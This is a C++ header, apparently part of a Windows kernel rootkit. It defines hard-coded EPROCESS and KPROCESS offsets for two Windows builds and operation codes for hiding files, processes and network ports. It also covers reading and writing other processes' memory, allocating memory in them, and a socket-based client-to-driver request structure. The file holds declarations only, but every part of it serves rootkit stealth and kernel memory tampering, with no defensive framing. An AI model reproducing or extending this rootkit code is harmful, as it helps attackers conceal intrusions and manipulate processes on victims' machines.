#pragma once
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <WS2tcpip.h>
#include <winsock2.h>
#include <Windows.h>
#include <random>
#include <Psapi.h>
#include <TlHelp32.h>
#include <winnt.h>
#include <iostream>
#include <stdint.h>
#define REGULAR_BUFFER 0xdeafbeed
#define EPROCESS_SIZE 0x850 // Size of an EPROCESS structure in 1809
#define EPROCESS22H2_SIZE 0xa30 // Size of an EPROCESS structure in 22H2



/*
=====================
REQUIRED DEFINITIONS:
=====================
*/


// Definitions of file hiding values:
#define SHOW_HIDDEN 0x7777FFFFFFFFFFFF  // Remove a file from HookHide
#define HIDE_FILE 0xFFFFFFFFFFFFFFFF  // Hide a file in HookHide
#define UNHIDE_FILEFOLDER ((NTSTATUS)0x00000121L)  // Temporary success for un-hiding file/folder
#define HIDE_FILEFOLDER  ((NTSTATUS)0x40000028L)  // Temporary success for hiding file/folder
#define SHOWHIDDEN_FILEFOLDER ((NTSTATUS)0x00000125L)  // Temporary success for showing list
#define UNHIDE_PROCESS ((NTSTATUS)0xC00000C3L)  // Code used by client/medium for unhiding process
#define HIDE_PROCESS ((NTSTATUS)0xC00000D6L)  // Code used by client/medium for hiding process
#define SHOWHIDDEN_PROCESS ((NTSTATUS)0xC00000E4L)  // Code used by client/medium for listing hidden processes


// Internal EPROCESS/KPROCESS of 1809:
enum KPROCESS_OFFSETS {
	KPOF_Header = 0x000,
	KPOF_ProfileListHead = 0x018,
	KPOF_DirectoryTableBase = 0x028,
	KPOF_ThreadListHead = 0x030,
	KPOF_ProcessLock = 0x040,
	KPOF_ProcessTimerDelay = 0x044,
	KPOF_DeepFreezeStartTime = 0x048,
	KPOF_Affinity = 0x050,
	KPOF_ReadyListHead = 0x0f8,
	KPOF_SwapListEntry = 0x108,
	KPOF_ActiveProcessors = 0x110,
	KPOF_AutoAlignment = 0x1b8,
	KPOF_DisableBoost = 0x1b8,
	KPOF_DisableQuantum = 0x1b8,
	KPOF_DeepFreeze = 0x1b8,
	KPOF_TimerVirtualization = 0x1b8,
	KPOF_CheckStackExtents = 0x1b8,
	KPOF_CacheIsolationEnabled = 0x1b8,
	KPOF_PpmPolicy = 0x1b8,
	KPOF_ActiveGroupsMask = 0x1b8,
	KPOF_VaSpaceDeleted = 0x1b8,
	KPOF_ReservedFlags = 0x1b8,
	KPOF_ProcessFlags = 0x1b8,
	KPOF_BasePriority = 0x1bc,
	KPOF_QuantumReset = 0x1bd,
	KPOF_Visited = 0x1be,
	KPOF_Flags = 0x1bf,
	KPOF_ThreadSeed = 0x1c0,
	KPOF_IdealNode = 0x210,
	KPOF_IdealGlobalNode = 0x238,
	KPOF_Spare1 = 0x23a,
	KPOF_StackCount = 0x23c,
	KPOF_ProcessListEntry = 0x240,
	KPOF_CycleTime = 0x250,
	KPOF_ContextSwitches = 0x258,
	KPOF_SchedulingGroup = 0x260,
	KPOF_FreezeCount = 0x268,
	KPOF_KernelTime = 0x26c,
	KPOF_UserTime = 0x270,
	KPOF_ReadyTime = 0x274,
	KPOF_UserDirectoryTableBase = 0x278,
	KPOF_AddressPolicy = 0x280,
	KPOF_Spare2 = 0x281,
	KPOF_InstrumentationCallback = 0x2c8,
	KPOF_SecureState = 0x2d0,
};

enum EPROCESS_OFFSETS {
	EPOF_Pcb = 0x000,
	EPOF_ProcessLock = 0x2d8,
	EPOF_UniqueProcessId = 0x2e0,
	EPOF_ActiveProcessLinks = 0x2e8,
	EPOF_RundownProtect = 0x2f8,
	EPOF_Flags2 = 0x300,
	EPOF_JobNotReallyActive = 0x300,
	EPOF_AccountingFolded = 0x300,
	EPOF_NewProcessReported = 0x300,
	EPOF_ExitProcessReported = 0x300,
	EPOF_ReportCommitChanges = 0x300,
	EPOF_LastReportMemory = 0x300,
	EPOF_ForceWakeCharge = 0x300,
	EPOF_CrossSessionCreate = 0x300,
	EPOF_NeedsHandleRundown = 0x300,
	EPOF_RefTraceEnabled = 0x300,
	EPOF_PicoCreated = 0x300,
	EPOF_EmptyJobEvaluated = 0x300,
	EPOF_DefaultPagePriority = 0x300,
	EPOF_PrimaryTokenFrozen = 0x300,
	EPOF_ProcessVerifierTarget = 0x300,
	EPOF_RestrictSetThreadContext = 0x300,
	EPOF_AffinityPermanent = 0x300,
	EPOF_AffinityUpdateEnable = 0x300,
	EPOF_PropagateNode = 0x300,
	EPOF_ExplicitAffinity = 0x300,
	EPOF_ProcessExecutionState = 0x300,
	EPOF_EnableReadVmLogging = 0x300,
	EPOF_EnableWriteVmLogging = 0x300,
	EPOF_FatalAccessTerminationRequested = 0x300,
	EPOF_DisableSystemAllowedCpuSet = 0x300,
	EPOF_ProcessStateChangeRequest = 0x300,
	EPOF_ProcessStateChangeInProgress = 0x300,
	EPOF_InPrivate = 0x300,
	EPOF_Flags = 0x304,
	EPOF_CreateReported = 0x304,
	EPOF_NoDebugInherit = 0x304,
	EPOF_ProcessExiting = 0x304,
	EPOF_ProcessDelete = 0x304,
	EPOF_ManageExecutableMemoryWrites = 0x304,
	EPOF_VmDeleted = 0x304,
	EPOF_OutswapEnabled = 0x304,
	EPOF_Outswapped = 0x304,
	EPOF_FailFastOnCommitFail = 0x304,
	EPOF_Wow64VaSpace4Gb = 0x304,
	EPOF_AddressSpaceInitialized = 0x304,
	EPOF_SetTimerResolution = 0x304,
	EPOF_BreakOnTermination = 0x304,
	EPOF_DeprioritizeViews = 0x304,
	EPOF_WriteWatch = 0x304,
	EPOF_ProcessInSession = 0x304,
	EPOF_OverrideAddressSpace = 0x304,
	EPOF_HasAddressSpace = 0x304,
	EPOF_LaunchPrefetched = 0x304,
	EPOF_Background = 0x304,
	EPOF_VmTopDown = 0x304,
	EPOF_ImageNotifyDone = 0x304,
	EPOF_PdeUpdateNeeded = 0x304,
	EPOF_VdmAllowed = 0x304,
	EPOF_ProcessRundown = 0x304,
	EPOF_ProcessInserted = 0x304,
	EPOF_DefaultIoPriority = 0x304,
	EPOF_ProcessSelfDelete = 0x304,
	EPOF_SetTimerResolutionLink = 0x304,
	EPOF_CreateTime = 0x308,
	EPOF_ProcessQuotaUsage = 0x310,
	EPOF_ProcessQuotaPeak = 0x320,
	EPOF_PeakVirtualSize = 0x330,
	EPOF_VirtualSize = 0x338,
	EPOF_SessionProcessLinks = 0x340,
	EPOF_ExceptionPortData = 0x350,
	EPOF_ExceptionPortValue = 0x350,
	EPOF_ExceptionPortState = 0x350,
	EPOF_Token = 0x358,
	EPOF_MmReserved = 0x360,
	EPOF_AddressCreationLock = 0x368,
	EPOF_PageTableCommitmentLock = 0x370,
	EPOF_RotateInProgress = 0x378,
	EPOF_ForkInProgress = 0x380,
	EPOF_CommitChargeJob = 0x388,
	EPOF_CloneRoot = 0x390,
	EPOF_NumberOfPrivatePages = 0x398,
	EPOF_NumberOfLockedPages = 0x3a0,
	EPOF_Win32Process = 0x3a8,
	EPOF_Job = 0x3b0,
	EPOF_SectionObject = 0x3b8,
	EPOF_SectionBaseAddress = 0x3c0,
	EPOF_Cookie = 0x3c8,
	EPOF_WorkingSetWatch = 0x3d0,
	EPOF_Win32WindowStation = 0x3d8,
	EPOF_InheritedFromUniqueProcessId = 0x3e0,
	EPOF_Spare0 = 0x3e8,
	EPOF_OwnerProcessId = 0x3f0,
	EPOF_Peb = 0x3f8,
	EPOF_Session = 0x400,
	EPOF_Spare1 = 0x408,
	EPOF_QuotaBlock = 0x410,
	EPOF_ObjectTable = 0x418,
	EPOF_DebugPort = 0x420,
	EPOF_WoW64Process = 0x428,
	EPOF_DeviceMap = 0x430,
	EPOF_EtwDataSource = 0x438,
	EPOF_PageDirectoryPte = 0x440,
	EPOF_ImageFilePointer = 0x448,
	EPOF_ImageFileName = 0x450,
	EPOF_PriorityClass = 0x45f,
	EPOF_SecurityPort = 0x460,
	EPOF_SeAuditProcessCreationInfo = 0x468,
	EPOF_JobLinks = 0x470,
	EPOF_HighestUserAddress = 0x480,
	EPOF_ThreadListHead = 0x488,
	EPOF_ActiveThreads = 0x498,
	EPOF_ImagePathHash = 0x49c,
	EPOF_DefaultHardErrorProcessing = 0x4a0,
	EPOF_LastThreadExitStatus = 0x4a4,
	EPOF_PrefetchTrace = 0x4a8,
	EPOF_LockedPagesList = 0x4b0,
	EPOF_ReadOperationCount = 0x4b8,
	EPOF_WriteOperationCount = 0x4c0,
	EPOF_OtherOperationCount = 0x4c8,
	EPOF_ReadTransferCount = 0x4d0,
	EPOF_WriteTransferCount = 0x4d8,
	EPOF_OtherTransferCount = 0x4e0,
	EPOF_CommitChargeLimit = 0x4e8,
	EPOF_CommitCharge = 0x4f0,
	EPOF_CommitChargePeak = 0x4f8,
	EPOF_Vm = 0x500,
	EPOF_MmProcessLinks = 0x610,
	EPOF_ModifiedPageCount = 0x620,
	EPOF_ExitStatus = 0x624,
	EPOF_VadRoot = 0x628,
	EPOF_VadHint = 0x630,
	EPOF_VadCount = 0x638,
	EPOF_VadPhysicalPages = 0x640,
	EPOF_VadPhysicalPagesLimit = 0x648,
	EPOF_AlpcContext = 0x650,
	EPOF_TimerResolutionLink = 0x670,
	EPOF_TimerResolutionStackRecord = 0x680,
	EPOF_RequestedTimerResolution = 0x688,
	EPOF_SmallestTimerResolution = 0x68c,
	EPOF_ExitTime = 0x690,
	EPOF_InvertedFunctionTable = 0x698,
	EPOF_InvertedFunctionTableLock = 0x6a0,
	EPOF_ActiveThreadsHighWatermark = 0x6a8,
	EPOF_LargePrivateVadCount = 0x6ac,
	EPOF_ThreadListLock = 0x6b0,
	EPOF_WnfContext = 0x6b8,
	EPOF_ServerSilo = 0x6c0,
	EPOF_SignatureLevel = 0x6c8,
	EPOF_SectionSignatureLevel = 0x6c9,
	EPOF_Protection = 0x6ca,
	EPOF_HangCount = 0x6cb,
	EPOF_GhostCount = 0x6cb,
	EPOF_PrefilterException = 0x6cb,
	EPOF_Flags3 = 0x6cc,
	EPOF_Minimal = 0x6cc,
	EPOF_ReplacingPageRoot = 0x6cc,
	EPOF_Crashed = 0x6cc,
	EPOF_JobVadsAreTracked = 0x6cc,
	EPOF_VadTrackingDisabled = 0x6cc,
	EPOF_AuxiliaryProcess = 0x6cc,
	EPOF_SubsystemProcess = 0x6cc,
	EPOF_IndirectCpuSets = 0x6cc,
	EPOF_RelinquishedCommit = 0x6cc,
	EPOF_HighGraphicsPriority = 0x6cc,
	EPOF_CommitFailLogged = 0x6cc,
	EPOF_ReserveFailLogged = 0x6cc,
	EPOF_SystemProcess = 0x6cc,
	EPOF_HideImageBaseAddresses = 0x6cc,
	EPOF_AddressPolicyFrozen = 0x6cc,
	EPOF_ProcessFirstResume = 0x6cc,
	EPOF_ForegroundExternal = 0x6cc,
	EPOF_ForegroundSystem = 0x6cc,
	EPOF_HighMemoryPriority = 0x6cc,
	EPOF_EnableProcessSuspendResumeLogging = 0x6cc,
	EPOF_EnableThreadSuspendResumeLogging = 0x6cc,
	EPOF_SecurityDomainChanged = 0x6cc,
	EPOF_SecurityFreezeComplete = 0x6cc,
	EPOF_VmProcessorHost = 0x6cc,
	EPOF_DeviceAsid = 0x6d0,
	EPOF_SvmData = 0x6d8,
	EPOF_SvmProcessLock = 0x6e0,
	EPOF_SvmLock = 0x6e8,
	EPOF_SvmProcessDeviceListHead = 0x6f0,
	EPOF_LastFreezeInterruptTime = 0x700,
	EPOF_DiskCounters = 0x708,
	EPOF_PicoContext = 0x710,
	EPOF_EnclaveTable = 0x718,
	EPOF_EnclaveNumber = 0x720,
	EPOF_EnclaveLock = 0x728,
	EPOF_HighPriorityFaultsAllowed = 0x730,
	EPOF_EnergyContext = 0x738,
	EPOF_VmContext = 0x740,
	EPOF_SequenceNumber = 0x748,
	EPOF_CreateInterruptTime = 0x750,
	EPOF_CreateUnbiasedInterruptTime = 0x758,
	EPOF_TotalUnbiasedFrozenTime = 0x760,
	EPOF_LastAppStateUpdateTime = 0x768,
	EPOF_LastAppStateUptime = 0x770,
	EPOF_LastAppState = 0x770,
	EPOF_SharedCommitCharge = 0x778,
	EPOF_SharedCommitLock = 0x780,
	EPOF_SharedCommitLinks = 0x788,
	EPOF_AllowedCpuSets = 0x798,
	EPOF_DefaultCpuSets = 0x7a0,
	EPOF_AllowedCpuSetsIndirect = 0x798,
	EPOF_DefaultCpuSetsIndirect = 0x7a0,
	EPOF_DiskIoAttribution = 0x7a8,
	EPOF_DxgProcess = 0x7b0,
	EPOF_Win32KFilterSet = 0x7b8,
	EPOF_ProcessTimerDelay = 0x7c0,
	EPOF_KTimerSets = 0x7c8,
	EPOF_KTimer2Sets = 0x7cc,
	EPOF_ThreadTimerSets = 0x7d0,
	EPOF_VirtualTimerListLock = 0x7d8,
	EPOF_VirtualTimerListHead = 0x7e0,
	EPOF_WakeChannel = 0x7f0,
	EPOF_WakeInfo = 0x7f0,
	EPOF_MitigationFlags = 0x820,
	EPOF_MitigationFlagsValues = 0x820,
	EPOF_MitigationFlags2 = 0x824,
	EPOF_MitigationFlags2Values = 0x824,
	EPOF_PartitionObject = 0x828,
	EPOF_SecurityDomain = 0x830,
	EPOF_ParentSecurityDomain = 0x838,
	EPOF_CoverageSamplerContext = 0x840,
	EPOF_MmHotPatchContext = 0x848,
};


// special return type for specific cases (send, receive..) -
typedef struct _PASS_DATA {
	int value;
	BOOL err;
	BOOL Term;
}PASS_DATA, * PPASS_DATA;


// network info structure for each side -
typedef struct _NETWORK_INFO {
	const char* IP;
	USHORT Port;
	sockaddr_in AddrInfo;
	SOCKET AsoSock;
}NETWORK_INFO, * PNETWORK_INFO;


typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
} UNICODE_STRING;
typedef UNICODE_STRING* PUNICODE_STRING;
typedef const UNICODE_STRING* PCUNICODE_STRING;


#define STATUS_UNSUCCESSFUL ((NTSTATUS)0xC0000001L)

typedef struct _CLIENT_ID {
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID;
typedef CLIENT_ID* PCLIENT_ID;


// structs about requesting specific data from ZwQuerySystemInformation -
typedef struct _SYSTEM_PROCESSOR_PERFORMANCE_INFORMATION {
	LARGE_INTEGER IdleTime;
	LARGE_INTEGER KernelTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER Reserved1[2];
	ULONG Reserved2;
} SYSTEM_PROCESSOR_PERFORMANCE_INFORMATION, * PSYSTEM_PROCESSOR_PERFORMANCE_INFORMATION;

typedef struct _SYSTEM_PROCESS_INFORMATION {
	ULONG NextEntryOffset;
	ULONG NumberOfThreads;
	BYTE Reserved1[48];
	UNICODE_STRING ImageName;
	LONG BasePriority;
	HANDLE UniqueProcessId;
	PVOID Reserved2;
	ULONG HandleCount;
	ULONG SessionId;
	PVOID Reserved3;
	SIZE_T PeakVirtualSize;
	SIZE_T VirtualSize;
	ULONG Reserved4;
	SIZE_T PeakWorkingSetSize;
	SIZE_T WorkingSetSize;
	PVOID Reserved5;
	SIZE_T QuotaPagedPoolUsage;
	PVOID Reserved6;
	SIZE_T QuotaNonPagedPoolUsage;
	SIZE_T PagefileUsage;
	SIZE_T PeakPagefileUsage;
	SIZE_T PrivatePageCount;
	LARGE_INTEGER Reserved7[6];
} SYSTEM_PROCESS_INFORMATION, * PSYSTEM_PROCESS_INFORMATION;

typedef struct _SYSTEM_THREAD_INFORMATION {
	LARGE_INTEGER Reserved1[3];
	ULONG Reserved2;
	PVOID StartAddress;
	CLIENT_ID ClientId;
	LONG Priority;
	LONG BasePriority;
	ULONG Reserved3;
	ULONG ThreadState;
	ULONG WaitReason;
} SYSTEM_THREAD_INFORMATION, * PSYSTEM_THREAD_INFORMATION;

typedef struct _SYSTEM_REGISTRY_QUOTA_INFORMATION {
	ULONG RegistryQuotaAllowed;
	ULONG RegistryQuotaUsed;
	PVOID Reserved1;
} SYSTEM_REGISTRY_QUOTA_INFORMATION, * PSYSTEM_REGISTRY_QUOTA_INFORMATION;

typedef struct _SYSTEM_BASIC_INFORMATION {
	BYTE Reserved1[24];
	PVOID Reserved2[4];
	CCHAR NumberOfProcessors;
} SYSTEM_BASIC_INFORMATION, * PSYSTEM_BASIC_INFORMATION;

typedef struct _SYSTEM_TIMEOFDAY_INFORMATION {
	BYTE Reserved1[48];
} SYSTEM_TIMEOFDAY_INFORMATION, * PSYSTEM_TIMEOFDAY_INFORMATION;

typedef struct _SYSTEM_PERFORMANCE_INFORMATION {
	BYTE Reserved1[312];
} SYSTEM_PERFORMANCE_INFORMATION, * PSYSTEM_PERFORMANCE_INFORMATION;

typedef struct _SYSTEM_EXCEPTION_INFORMATION {
	BYTE Reserved1[16];
} SYSTEM_EXCEPTION_INFORMATION, * PSYSTEM_EXCEPTION_INFORMATION;

typedef struct _SYSTEM_LOOKASIDE_INFORMATION {
	BYTE Reserved1[32];
} SYSTEM_LOOKASIDE_INFORMATION, * PSYSTEM_LOOKASIDE_INFORMATION;

typedef struct _SYSTEM_INTERRUPT_INFORMATION {
	BYTE Reserved1[24];
} SYSTEM_INTERRUPT_INFORMATION, * PSYSTEM_INTERRUPT_INFORMATION;

typedef struct _SYSTEM_POLICY_INFORMATION {
	PVOID Reserved1[2];
	ULONG Reserved2[3];
} SYSTEM_POLICY_INFORMATION, * PSYSTEM_POLICY_INFORMATION;

typedef struct _SYSTEM_CODEINTEGRITY_INFORMATION {
	ULONG   Length;
	ULONG   CodeIntegrityOptions;
} SYSTEM_CODEINTEGRITY_INFORMATION, * PSYSTEM_CODEINTEGRITY_INFORMATION;


// Struct to get information about a specific process module -
typedef struct _RTL_PROCESS_MODULE_INFORMATION
{
	HANDLE Section;
	PVOID MappedBase;
	PVOID ImageBase;
	ULONG ImageSize;
	ULONG Flags;
	USHORT LoadOrderIndex;
	USHORT InitOrderIndex;
	USHORT LoadCount;
	USHORT OffsetToFileName;
	UCHAR  FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, * PRTL_PROCESS_MODULE_INFORMATION;

typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemBasicInformation = 0,
	SystemPerformanceInformation = 2,
	SystemTimeOfDayInformation = 3,
	SystemProcessInformation = 5,
	SystemProcessorPerformanceInformation = 8,
	SystemInterruptInformation = 23,
	SystemExceptionInformation = 33,
	SystemRegistryQuotaInformation = 37,
	SystemLookasideInformation = 45,
	SystemCodeIntegrityInformation = 103,
	SystemPolicyInformation = 134,
	SystemModuleInformation = 0xB,
} SYSTEM_INFORMATION_CLASS;


/*
============================
DEPENDENCIES OF MAIN STRUCT:
============================
*/


// special statuses for different events and requests -
typedef enum _ROOTKIT_STATUS {
	ROOTKSTATUS_SUCCESS = 0xFF000000,
	ROOTKSTATUS_SYSTEMSPC = 0xFF000001,
	ROOTKSTATUS_PRCPEB = 0xFF000002,
	ROOTKSTATUS_PRCLOADMDLS = 0xFF000003,
	ROOTKSTATUS_OTHER = 0xFF000004,
	ROOTKSTATUS_ADRBUFSIZE = 0xFF000005,
	ROOTKSTATUS_QUERYVIRTMEM = 0xFF000006,
	ROOTKSTATUS_INVARGS = 0xFF000007,
	ROOTKSTATUS_PROTECTIONSTG = 0xFF000008,
	ROOTKSTATUS_NOWRITEPRMS = 0xFF000009,
	ROOTKSTATUS_COPYFAIL = 0x0000000A,
	ROOTKSTATUS_LESSTHNREQ = 0xFF00000B,
	ROOTKSTATUS_MEMALLOC = 0xFF00000C,
	ROOTKSTATUS_NOTCOMMITTED = 0xFF00000D,
	ROOTKSTATUS_QUERYSYSINFO = 0xFF00000E,
	ROOTKSTATUS_PROCHANDLE = 0xFF00000F,
	ROOTKSTATUS_ACSVIO = 0xFF000010,
	ROOTKSTATUS_NOTSUPPORTED = 0xFF000011,
	ROOTKSTATUS_NOTINRELRANGE = 0xFF000012,
	ROOTKSTATUS_PROCESSEPRC = 0XFF000013,
	ROOTKSTATUS_USERSPACE = 0XFF000014,
}ROOTKIT_STATUS, * PROOTKIT_STATUS;


// special request constants -
typedef enum _ROOTKIT_OPERATION {
	RKOP_WRITE = 0xB000006F,
	RKOP_READ = 0xB000007F,
	RKOP_MDLBASE = 0xB000008F,
	RKOP_SYSINFO = 0xB000009F,
	RKOP_PRCMALLOC = 0xB00000AF,
	RKOP_HIDEFILE = 0xB00000BF,
	RKOP_HIDEPROC = 0xB00000CF,
	RKOP_HIDEPORT = 0xB00000DF,

	RKOP_NOOPERATION = 0xB00000EF,
	RKOP_TERMINATE = 0xB00000FF,
}ROOTKIT_OPERATION, * PROOTKIT_OPERATION;


// unexpected error constants -
typedef enum _ROOTKIT_UNEXERR {
	successful = 0x7F7F0000,
	memalloc = 0x7F7F0001,
	relevantpid = 0x7F7F0002,
	receivedata = 0x7F7F0003,
	sendmessage = 0x7F7F0004,
	invalidargs = 0x7F7F0005,
}ROOTKIT_UNEXERR, * PROOTKIT_UNEXERR;


// special struct for sending data about specific system information request -
typedef struct _RKSYSTEM_INFORMATION_CLASS {
	SYSTEM_INFORMATION_CLASS InfoType;
	ULONG InfoSize;
	ROOTKIT_STATUS ReturnStatus;
	PVOID PoolBuffer;
} RKSYSTEM_INFORMATION_CLASS, * PRKSYSTEM_INFORMATION_CLASS;


// Struct for passing string data -
typedef struct _STRING_DATA {
	const char* String;
	SIZE_T StrLen;
} STRING_DATA, * PSTRING_DATA;


/*
============
MAIN STRUCT:
============
*/


typedef struct _ROOTKIT_MEMORY {  // Used for communicating with the KM driver
	NTSTATUS Status;  // gets filled by the driver when the operation ends
	ROOTKIT_STATUS StatusCode;  // explains what the status means and why it is what it is
	ROOTKIT_OPERATION Operation;  // what operation to do (by defines)
	PVOID Buffer;  // buffer address (used for example in inputs)
	PVOID Out;  // pointer in memory to the output of the memory function
	ULONG64 Size; // size of memory chunk
	ULONG64 MainPID; // process that works on the memory
	ULONG64 SemiPID;  // (if the operation requests for reading) what is the PID of the destination process?
	ULONG64 MedPID;  // If needed, provide medium process PID
	const char* MdlName;  // (if the operation requests for a module base) what is the name of the module?
	const char* DstMdlName;  // (if the operation requests for a module base) what is the name of the module?
	ROOTKIT_UNEXERR Unexpected;  // data about an unexpected error that happened during the operation, is not relevant to driver
	BOOL IsFlexible;  // specifies if operations can be flexible
	PVOID Reserved;  // used for extra parameters needed to function
}ROOTKIT_MEMORY;